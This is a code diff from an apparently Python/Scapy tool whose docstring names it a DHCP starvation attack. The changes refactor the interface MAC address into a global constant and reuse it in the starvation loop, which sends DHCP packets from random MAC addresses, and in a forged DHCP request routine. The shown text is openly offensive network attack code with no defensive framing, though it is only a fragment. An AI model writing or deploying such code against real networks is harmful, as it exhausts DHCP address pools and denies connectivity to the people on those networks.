@@ -12,6 +12,7 @@ IFACE = conf.iface
 BROADCAST_MAC = 'ff:ff:ff:ff:ff:ff'
 META_ADDR = "0.0.0.0"
 BROADCAST_IP = "255.255.255.255"
+HW = get_if_hwaddr(IFACE)
 
 # DHPC Options
 MSG_TYPE = 0
@@ -43,15 +44,14 @@ class DHCPStarvation(object):
 
 
 def dhcp_starve():
-    """  """
-    hw = get_if_hwaddr(IFACE)
+    """ DHCP Starvation Attack """
     my_own_ip = get_if_addr(IFACE)
     server_addr = conf.route.route(META_ADDR)[2]
 
     for i in range(256):
         random_mac = RandMAC()
         packet = DHCPStarvation(iface=IFACE,
-                                hardware_addr=hw,
+                                hardware_addr=HW,
                                 broadcast_mac=BROADCAST_MAC,
                                 meta_addr=META_ADDR,
                                 broadcast_ip=BROADCAST_IP,
@@ -73,7 +73,7 @@ def dhcp_pkt_filter(pkt):
 
 
 def dhcp_req(pkt):
-    dhcp_request = Ether(src=pkt[Ether].dst, dst=pkt[Ether].src) \
+    dhcp_request = Ether(src=HW, dst=pkt[Ether].src) \
                     / IP(src=META_ADDR, dst=BROADCAST_IP) \
                     / UDP(sport=CLIENT_DHCP_PORT, dport=SERVER_DHCP_PORT) \
                     / BOOTP(chaddr=pkt[BOOTP].chaddr) \
